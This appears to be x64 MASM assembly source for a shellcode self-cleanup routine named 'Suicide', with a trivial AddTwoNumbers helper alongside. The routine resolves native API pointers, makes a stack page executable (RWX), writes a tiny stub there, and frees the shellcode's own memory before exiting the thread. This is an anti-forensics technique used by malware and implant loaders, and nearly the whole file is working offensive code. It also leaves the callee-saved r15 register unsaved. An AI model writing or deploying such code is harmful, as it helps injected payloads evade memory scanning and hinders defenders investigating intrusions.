; ml64.exe /c /Fo suicide.obj .\suicide.asm

; Define a segment that you want the linker to recognize as part of ".stub"
_STUB SEGMENT PARA 'CODE' ALIAS('.stub') 
_STUB ENDS

; Tell MASM to assemble subsequent code into this _STUB segment
_STUB SEGMENT

    ; PUBLIC AddTwoNumbers ; Make it callable from C++
    AddTwoNumbers PROC

        ; RCX will hold the first argument (a)
        ; RDX will hold the second argument (b)
        ; RAX will hold the return value
        mov rax, rcx            ; Move the first argument (a) from RCX to RAX
        add rax, rdx            ; Add the second argument (b) from RDX to RAX
        ; int 3
        ret                     ; Return to the caller (result is in RAX)
    AddTwoNumbers ENDP

    Suicide PROC

        ; On entry (x64 __fastcall from C++):
        ; RCX = pBaseAddressToFree
        ; RDX = resolved_pfnNtFreeVirtualMemory
        ; R8  = resolved_pfnRtlExitUserThread
        ; R9  = resolved_pfnNtProtectVirtualMemory

        push rbp
        mov rbp, rsp
        
        ; --- Save Callee-Saved Registers ---
        push rbx
        push rsi
        push rdi
        push r12
        push r13
        push r14

        ; --- Allocate Stack Space for Local Variables ---
        ; We need space for:
        ; - Micro-stub code (e.g., 6 bytes for 'xor rcx, rcx; jmp r14')
        ; - NtProtectVirtualMemory arguments (PVOID* BaseAddress, PSIZE_T RegionSize, PULONG OldAccessProtection)
        ;   These are pointers to values that will be stored on the stack.
        ;   BaseAddress (8 bytes) + RegionSize (8 bytes) + OldAccessProtection (4 bytes) = 20 bytes for values.
        ;   These values need to be at addresses relative to RBP.
        ;   Let's ensure we have enough space for these and any alignment.
        ;   The lowest RBP offset used for locals will be [rbp - 98h] for OldProtect.
        ;   So, we need at least 0xA0 (160 bytes) to cover this and provide padding for alignment.
        sub rsp, 0A0h ; Allocate 0xA0 (160 bytes) for this function's stack frame. Ensures 16-byte alignment.

        ; --- Store Incoming Arguments into Callee-Saved Registers ---
        mov r12, rcx                        ; r12 = pBaseAddressToFree (original shellcode's base address)
        mov r13, rdx                        ; r13 = pfnNtFreeVirtualMemory
        mov r14, r8                         ; r14 = pfnRtlExitUserThread (used by micro-stub)
        mov r15, r9                         ; r15 = pfnNtProtectVirtualMemory

        ; --- Define and Store the Micro-stub on the Stack ---
        mov byte ptr [rbp - 40h], 48h       ; Micro-stub instruction 1: XOR RCX, RCX
        mov byte ptr [rbp - 3Fh], 31h
        mov byte ptr [rbp - 3Eh], 0C9h    
        mov byte ptr [rbp - 3Dh], 41h       ; Micro-stub instruction 2: JMP R14 (RtlExitUserThread)
        mov byte ptr [rbp - 3Ch], 0FFh
        mov byte ptr [rbp - 3Bh], 0E6h
        
        ; --- Call NtProtectVirtualMemory to make the STACK Page Executable ---

        xor rcx, rcx                        ; ProcessHandle (HANDLE ProcessHandle)
        dec rcx                             ; RCX = 0xFFFFFFFFFFFFFFFF (NT_CURRENT_PROCESS)

        ; Argument 2: BaseAddress (IN OUT PVOID *BaseAddress)
        ; RDX = Pointer to a PVOID variable holding the page-aligned address of the micro-stub.
        lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        and rax, -1000h                     ; Page-align it downwards to get the stack page base address
        mov qword ptr [rbp - 88h], rax      ; Store the aligned stack page base address in a local variable
        lea rdx, [rbp - 88h]                ; RDX = Pointer to [rbp - 88h] (which holds the stack page base)

        mov qword ptr [rbp - 90h], 1000h    ; Store 0x1000 (one page) as a 64-bit SIZE_T in a local variable
        lea r8, [rbp - 90h]                 ; R8 = Pointer to [rbp - 90h] (which holds the region size)

        mov r9d, 40h                        ; R9D = PAGE_EXECUTE_READWRITE (0x40)

        mov dword ptr [rbp - 98h], 0        ; OldAccessProtection (OUT PULONG OldAccessProtection)
        lea rax, [rbp - 98h]                ; RAX = Pointer to [rbp - 98h]

        ; --- Stack Management for the NtProtectVirtualMemory Call ---
        sub rsp, 30h                        ; Shadow Space 32 + space for stack arguments ie. 0x20 (shadow) + 0x08 (5th arg) = 0x28 bytes.
        mov qword ptr [rsp + 20h], rax      ; Place the 5th argument

        ; int 3
        call r15

        ; --- Post-Call Cleanup ---
        add rsp, 30h                        ; Restore RSP from the NtProtectVirtualMemory call

        ;-----------------------------------------------------------------------------------------------------------------------
        ;        --- Call NtFreeVirtualMemory to free original shellcode memory ---

        xor rcx, rcx
        dec rcx                             ; RCX = 0xFFFFFFFFFFFFFFFF (NT_CURRENT_PROCESS)

        mov rax, r12                        ; RAX = pBaseAddressToFree (original shellcode base)
        mov qword ptr [rbp - 88h], rax      ; Store pBaseAddressToFree in local variable for RDX dereference
        lea rdx, [rbp - 88h]                ; RDX = Pointer to [rbp - 88h] (which holds the shellcode base)

        mov qword ptr [rbp - 90h], 0        ; Store 0 for RegionSize (required for MEM_RELEASE)
        lea r8, [rbp - 90h]                 ; R8 = Pointer to [rbp - 90h] (which holds RegionSize)

        mov r9d, 8000h                      ; R9D = MEM_RELEASE (0x8000)

        ; --- Stack Management for the NtFreeVirtualMemory Call ---

        ; Instead of 'call r13' (which would return here), we will:
        ; 1. Push the address of our micro-stub onto the stack.
        ; 2. JUMP to NtFreeVirtualMemory (R13).
        ; This makes NtFreeVirtualMemory return directly to our micro-stub.
        lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        sub rsp, 20h                        ; Allocate 0x20 bytes for shadow space

        push rax                            ; Push micro-stub address onto stack, RSP 8-byte aligned (original RSP - 0x20 - 0x8)

        ; int 3
        jmp r13
        ; int 3

        ;-----------------------------------------------------------------------------------------------------------------------

        ; --- Function Epilogue (will not be reached due to jmp to RtlExitUserThread) ---

        ;-----------------------------------------------------------------------------------------------

    Suicide ENDP

_STUB ENDS ; End of this segment definition

END